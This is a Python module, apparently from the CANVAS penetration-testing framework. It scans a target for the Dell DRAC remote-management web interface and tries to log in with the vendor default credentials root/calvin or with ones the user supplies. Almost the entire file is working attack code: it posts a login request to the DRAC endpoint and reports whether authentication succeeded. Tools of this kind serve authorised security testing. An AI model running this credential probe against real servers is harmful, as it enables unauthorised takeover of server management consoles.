#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

import socket
from exploitutils import *

import urllib
import urllib2

from canvasexploit import canvasexploit
from contextlib import contextmanager

NAME                           = "delldrac"
DESCRIPTION                    = "Scan for DELL DRAC WEB interface"
DOCUMENTATION                  = {}
DOCUMENTATION["Notes"]         = """

This module will scan a target for the presence of DELL DRAC web admin
interface. This is done by performing a HTTPS request using the
DELL DRAC URI scheme and trying to login with the default credentials
(root/calvin) or ones specified.

This module currently works with version 6 of the DELL firmware.
"""

DOCUMENTATION['References']    = 'https://www.trustedsec.com/september-2012/owning-dell-drac-awesome-hack'
DOCUMENTATION['Repeatability'] = 'Infinite'
VERSION                        = "1.0"
PROPERTY                       = {}
PROPERTY['TYPE']               = "Recon"
PROPERTY['SITE']               = "Remote"

TIMEOUT                        = 20

@contextmanager
def no_timeout_socket():
    old           = socket.socket
    socket.socket = socket._no_timeoutsocket
    try:
        yield
    finally:
        socket.socket = old
        
class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.name         = NAME
        self.vhost        = ""
        self.url_ref      = 'https://%s/Applications/dellUI/RPC/WEBSES/create.asp'
        self.username     = 'root'
        self.password     = 'calvin'
        self.typed_result = {}

    def getArgs(self):
        self.getarg("vhost")
        self.getarg("username")
        self.getarg("password")

    def test(self):
        self.getArgs()
        s = self.gettcpsock()
        s.set_timeout(TIMEOUT)

        try:
            s.connect((self.target.interface, 443))
        except Exception:
            return 0
        finally:
            s.close()

        return 100
            
    def usage(self):
        print "Usage: %s -t target [-O vhost:] [-O username:] [-O password:]\n" % sys.argv[0]
        print "\t+vhost can be a virtual host string, if none is given target will be used"

    def run(self):
        self.setInfo("%s" % NAME)
        self.getArgs()

        result = ''

        url  = self.url_ref % (self.vhost or self.target.resolved_from)

        data = {"WEBVAR_USERNAME"   : self.username,
                "WEBVAR_PASSWORD"   : self.password,
                "WEBVAR_ISCMCLOGIN" : 0}

        self.log('Attacking %s, user: %s pass: %s' % (url, self.username, self.password))
        
        try:
            with no_timeout_socket():
                resp = urllib2.urlopen(urllib2.Request(url, urllib.urlencode(data)), timeout=TIMEOUT).read()

                if 'Failure_Login_IPMI_Then_LDAP' in resp:
                    result = 'Failed authentication.'
                elif 'Failure_No_Free_Slot' in resp:
                    result = 'Authentication success, no free session.'
                elif "'USERNAME' : 'root'" in resp:
                    result = 'Authentication success.'
        except Exception, ex:
            self.log('Error: %s' % ex)
            self.setInfo("%s - %s" % (NAME, ex))

        if result:
            self.typed_result['result'] = result
            self.typed_result['username'] = self.username
            self.typed_result['password'] = self.password

            self.log(result)

            self.setInfo("%s - success" % (NAME))
            self.setProgress(100)
            return 1

        self.setProgress(100)
        return 0
        
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    
    app = theexploit()
    ret = standard_callback_commandline(app)
